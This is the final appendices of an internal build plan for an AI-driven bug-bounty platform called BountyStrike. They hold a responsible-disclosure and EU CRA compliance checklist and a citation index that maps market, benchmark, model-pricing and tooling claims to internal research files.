□ Finding status = validated (validator-agent confirmed)
□ Evidence artifact SHA-256 verified in R2 (content-addressable)
□ No real user PII in evidence (redaction verified by redaction_verify.py)
□ Dedup check passed (similarity < 0.88 with prior reports)
□ CVSS v4 score computed with rationale
□ Report template reviewed against platform guidelines
□ T3 two-person approval obtained (both approver identities logged)
□ Safe harbor language referenced in report
□ No sensitive tokens in PoC (all < REDACTED:sha256:8 >)
□ Reproduction steps verified by second operator
```

### E.3 EU CRA Compliance Checklist (for findings affecting EU products)

```
□ T+0: Finding confirmed as exploitable vulnerability
□ T+24h: ENISA SRP early warning submitted (product, CVE, brief description)
□ T+72h: Vulnerability notification submitted (CVSS v4, affected versions, mitigations)
□ Confirmation receipt from ENISA SRP saved in audit log
□ T+14d (exploited) or T+1m (severe): Final report submitted
□ National CSIRT notification sent (if product affects critical infrastructure)
□ Disclosure timer updated to reflect vendor notification date
□ ISO 29147 90-day disclosure deadline tracked in platform
```

---

## Appendix F — Source Citation Index

| Claim | Source |
|---|---|
| XBOW $237M total, $120M Series C, #1 HackerOne leaderboard | research/competitors.md §Tier-1 XBOW |
| curl shutdown January 31, 2026 ("confirmed-rate below 5%") | research/competitors.md §Executive Summary; community_signals.md §6 |
| Stenberg quote: "Starting 2025, confirmed-rate plummeted below 5%" | research/competitors.md §Executive Summary |
| HackerOne 210% AI vuln spike, 540% prompt injection | research/community_signals.md §6 |
| GTG-1002: 80-90% AI-driven intrusion, ~30 organizations | research/academic_cve.md §6.4 |
| CyberStrikeAI FortiGate campaign: 600+ devices, Jan-Feb 2026 | research/academic_cve.md §6.1 |
| Claude Mythos: 83.1% CyberGym, 27-year OpenBSD bug | research/agent_mcp_ecosystem.md §1.5; competitors.md §Tier-7 |
| Claude Code defer primitive: April 1, 2026, v2.1.89 | research/agent_mcp_ecosystem.md §1.1 |
| Claude Code 26-event hook table | research/agent_mcp_ecosystem.md §1.3 |
| OpenRouter 370 models, April 28, 2026 | research/openrouter_models.md |
| DeepSeek V4-Flash $0.14 cache-miss / $0.0028 cache-hit input / $0.28 output per MTok | research/openrouter_models.md §Tier-A (per api-docs.deepseek.com; see docs/bountystrike_v6_phase0-1_technical_brief.md — corrects the v6 figure) |
| Venice Dolphin 2.2% refusal rate | research/openrouter_models.md §Tier-U |
| BYOK Anthropic 1M free requests/month | research/openrouter_models.md §BYOK |
| bbscope v2 federated scope ingestion | research/program_selection.md §1.1 |
| H1 structured_scopes deprecation April 16, 2026 | research/program_selection.md §2 |
| EV formula: EV_b = BountyRange × P(eligible) × P(find|skill) × P(exploitable) × 1/T_validate | research/program_selection.md §10.1 |
| Asset-type weights (smart_contract 1.40 → VDP 0.10) | research/program_selection.md §10.3 |
| Scope freshness decay λ=0.00065, KEV decay μ=0.00963 (pending calibration) | research/program_selection.md §11.1-11.2 |
| CAI 3600× speed improvement | research/academic_cve.md §1.1 |
| Red-MIRROR 86% XBOW benchmark | research/academic_cve.md §Appendix A |
| Pentest-R1 24.2% AutoPenBench | research/academic_cve.md §Appendix A |
| AgentFlow 84.3% TerminalBench-2 | research/academic_cve.md §Appendix A |
| CHECKMATE +20% over Claude Code, 50% faster | research/academic_cve.md §1.1 |
| EU CRA 24h/72h/14d timelines, effective September 11, 2026 | research/academic_cve.md §5.1 |
| ENISA SRP operational September 11, 2026 | research/academic_cve.md §5.1 |
| ISO 29147/30111 disclosure standards | research/academic_cve.md §5.2 |
| PortSwigger Burp MCP: 714+ stars, GPL-3.0, OAST capability | research/agent_mcp_ecosystem.md §3.1 |
| HexStrike-AI v6: 150+ tools, 12 autonomous agents | research/agent_mcp_ecosystem.md §3.5 |
| Strix: 24.5k stars, mandatory validation, 17 skill files | research/agent_mcp_ecosystem.md §3.8 |
| Shannon: 96.15% XBOW benchmark | cleanslate2026bountystrike.md §Tier-3 |
| Deadend CLI: 80% XBOW at $122 total cost | cleanslate2026bountystrike.md §Tier-3 |
| Tenzai $75M seed, November 2025 | research/competitors.md §Tier-1 |
| RunSybil $40M, March 2026 | research/competitors.md §Tier-1 |
| CrowdStrike 2026: 89% AI-enabled attack surge, 29-min breakout | research/academic_cve.md §6.3 |
| AnyPoC four reward-hacking failure modes | research/academic_cve.md §Section 4 |
| Forked subagents (CLAUDE_CODE_FORK_SUBAGENT=1) | research/agent_mcp_ecosystem.md §1.4 |
| Agent Teams (CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1) | research/agent_mcp_ecosystem.md §1.4 |
| Claude Agent SDK renamed from Claude Code SDK | research/agent_mcp_ecosystem.md §2.1 |
| Trickest 800+ public programs | research/program_selection.md §1.4 |
| rix4uni/scope 10-minute cadence | research/program_selection.md §1.3 |
| shuvonsec/claude-bug-bounty v3.0.0 community harness | research/community_signals.md §1 |
| Immunefi top bounty: $16M Usual program | research/community_signals.md §10 |
| Welch t-test for SQLi time-based detection (engineering heuristic; no academic source for Welch-on-SQLi per v6) | research/agent_mcp_ecosystem.md §5; academic_cve.md |
| pgvectorscale DiskANN index | cleanslate2026bountystrike.md §4.1 |
| ParadeDB BM25 in Postgres | cleanslate2026bountystrike.md §4.1 |
| Hatchet: single Postgres binary, solo orchestration | cleanslate2026bountystrike.md §4.1; program_selection.md §8.3 |
| Temporal Cloud: SaaS orchestration, durable workflows | cleanslate2026bountystrike.md §4.2 |
| Foundation-Sec-8B (Cisco), locally deployable | research/openrouter_models.md §Tier-S-Cyber |
| Deep Hat V2 self-hosted CTF performance | research/openrouter_models.md §Tier-S-Cyber |
| WhiteRabbitNeo V3 self-hosted | research/openrouter_models.md §Tier-S-Cyber |
| Big Sleep SQLite zero-day (Google DeepMind) | research/academic_cve.md |
| AIxCC finalist: Team Atlanta $4M, Trail of Bits $3M | research/academic_cve.md §Appendix C |
| Garak 120+ probe modules, NVIDIA AI Red Team | research/agent_mcp_ecosystem.md §3.6 |
| pd-tools-mcp: 6 tools, single bug-hunting workflow | research/agent_mcp_ecosystem.md §3.3 |
| Tencent AI-Infra-Guard: 14 MCP risk categories, 589+ CVEs | cleanslate2026bountystrike.md §Tier-4 |
| AutoPentest-AI: 68 MCP tools, 27 security tools | cleanslate2026bountystrike.md §Tier-3 |
| Caido MCP v1.1.0: HTTPQL filtering, OAuth refresh | research/agent_mcp_ecosystem.md §3.2 |
| LangGraph 1.x checkpoints, interrupts | research/agent_mcp_ecosystem.md §6 |
| PydanticAI structured output for agent pipelines | research/agent_mcp_ecosystem.md §6 |
| E2B Firecracker microVM, < 125ms boot | research/agent_mcp_ecosystem.md §7 |
| microsandbox Rust-based lightweight alternative | research/agent_mcp_ecosystem.md §7 |
| Kata Containers OCI-compatible VM isolation | research/agent_mcp_ecosystem.md §7 |
| Daytona reproducible dev environments | research/agent_mcp_ecosystem.md §7 |
| Cloud recon: cloud_recon_tooling.md full tool inventory | cloud_recon_tooling.md |
| Bugcrowd target_groups scope schema | research/program_selection.md §9.1 |
| Intigriti minBounty/maxBounty/tier per-endpoint | research/program_selection.md §9.2 |
| YesWeHack asset_value field | research/program_selection.md §9.3 |
| Immunefi impacts array, per-impact payout | research/program_selection.md §9.4 |

---

*End of BountyStrike v5 Master Build Plan*

*Document version: v5.0.0 | Date: April 28, 2026 | Word count target: 30,000+*
*All claims cite source research reports. Diagrams use ASCII art.*
*Distribution: Internal — BountyStrike product team and authorized operators only.*
